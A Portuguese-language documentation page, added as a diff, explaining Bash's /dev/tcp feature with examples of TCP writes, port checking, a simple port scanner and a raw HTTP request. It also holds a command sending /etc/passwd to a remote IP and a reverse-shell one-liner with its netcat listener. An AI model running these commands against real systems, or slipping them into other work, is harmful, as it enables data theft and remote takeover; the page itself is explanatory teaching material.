@@ -1,0 +1,100 @@
+---
+id: dev_tcp
+title: /dev/tcp/
+---
+
+O `/dev/tcp/` no Linux é uma funcionalidade especial do interpretador de
+comandos Bash que permite realizar conexões TCP diretamente através do sistema
+de arquivos. Ele não é um arquivo real no `/dev`, mas sim um recurso interno do
+Bash para abrir conexões de rede de forma simples.
+
+## Como funciona?
+
+O Bash interpreta `/dev/tcp/<host>/<porta>` como uma tentativa de abrir uma
+conexão TCP com o host e a porta especificados. Se a conexão for bem-sucedida,
+você pode enviar e receber dados como se estivesse lidando com um arquivo.
+
+## Uso Simples
+
+Abaixo estaremos enviando um 'hi' para o IP 172.16.0.2 na porta 4444:
+
+```bash
+echo 'hi' > /dev/tcp/172.16.0.2/4444
+```
+
+```bash
+cat /etc/passwd > /dev/tcp/172.16.0.2/4444
+```
+
+## Verificando Portas
+
+Ao tentar fazer uma conexão utilizando o `/dev/tcp`, caso o endpoint não esteja
+acessível irá retornar o código 1 de erro.
+
+```bash
+>/dev/tcp/172.16.0.2/4444
+echo $?
+```
+
+Com base no conceito do comando de cima é possível fazer uma lógica para
+determinar de forma mais amigável se a porta está aberta em determinado host
+(IP ou hostname).
+
+```bash
+{ echo > /dev/tcp/google.com/80; } 2>/dev/null && \
+    echo "Open port" || echo "Closed port"
+```
+
+Com isso é possível fazer um *portscan* simples:
+
+```bash
+seq 1 1000 | xargs -I{} bash -c '
+    { echo > /dev/tcp/192.168.0.1/{}; } 2>/dev/null && \
+    echo "{} Open port"
+'
+```
+
+## Request HTTP
+
+Para fazer uma requisição HTTP utilizando o `/dev/tcp` é um pouco complicado,
+pois precisamos utilizar *file descriptor*, porém se torna útil em ambientes sem
+o `curl` ou limitados como por exemplos os ambientes conteinerizados.
+
+```bash
+exec 3<>/dev/tcp/example.com/80
+echo -e "GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n" >&3
+cat <&3
+exec 3>&-
+```
+
+**Referências:**
+
+- [HTTP requests via /dev/tcp](https://rednafi.com/misc/http_requests_via_dev_tcp/)
+- [O que são file descriptors](https://blog.pantuza.com/artigos/o-que-sao-file-descriptors)
+- [Bash redirection fun with descriptors](https://copyconstruct.medium.com/bash-redirection-fun-with-descriptors-e799ec5a3c16)
+
+## TCP Shell Reverso
+
+No server que irá receber a conexão reversa com o *shell*:
+
+```bash
+nc -l 4444
+```
+
+Na máquina alvo que irá fazer a conexão reversa e passar a *shell*:
+
+```bash
+bash -i > /dev/tcp/172.16.0.1/4444 0>&1 2>&1
+```
+
+:::info
+Para recapitular, abaixo temos o código de cada fluxo padrão:
+
+STDIN: 0
+STDOUT: 1
+STDERR: 2
+
+`>&1` faz com que STDIN seja redirecionado para o mesmo destino de STDOUT, ou
+seja, os dados recebidos da conexão TCP agora são tratados como entrada para o
+Bash interativo e o mesmo acontece com o STDERR (`2>&1`).
+:::
